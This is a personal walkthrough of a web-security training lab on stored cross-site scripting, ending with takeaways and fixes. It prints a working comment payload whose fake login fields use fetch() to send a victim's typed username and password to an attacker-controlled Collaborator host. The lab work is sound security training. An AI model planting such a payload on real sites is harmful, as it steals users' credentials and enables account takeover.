Lab: Exploiting Cross-site Scripting to Capture Passwords
Difficulty: Practitioner

This one was all about abusing stored XSS to steal credentials. There’s a blog comment section that’s vulnerable, and a victim user (Carlos, probably) that views every comment after it's posted. Our job was to sneak in a payload that grabs their username and password and sends it to us.

First things first, I fired up Burp Suite Pro and opened the Collaborator tab. Hit “Copy to clipboard” to get my custom Collaborator payload (basically a public server Burp sets up so it can catch incoming requests for you).

Then I posted a comment with this payload, replacing the Collaborator link with mine:

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-COLLABORATOR-HOST',{
method:'POST',
mode:'no-cors',
body:username.value+':'+this.value
});">
Looks like nothing happened, but when the victim visited the comment, the script ran in their browser. It grabbed whatever they typed into the login form and sent it to my Burp Collaborator server via a POST request.

Went back to Burp, hit “Poll now” in the Collaborator tab, and boom—got a hit.

The body of the request had the creds, something like:

carlos:supersecurepassword
Logged in with those, hit the user dashboard. That was it. Lab solved.

Takeaways

The stored XSS allowed us to execute JavaScript in the victim’s browser.

Using fetch() and onchange, we exfiltrated the credentials without needing visible interaction.

Burp Collaborator is super useful when you need to receive data back from a vulnerable app without relying on external services.

Fixes

Sanitize and escape all user inputs before rendering them back on the page.

Don’t allow users to inject HTML, especially not <script> tags or raw event handlers.

Use Content Security Policy (CSP) as a backup defense to prevent inline scripts from running.
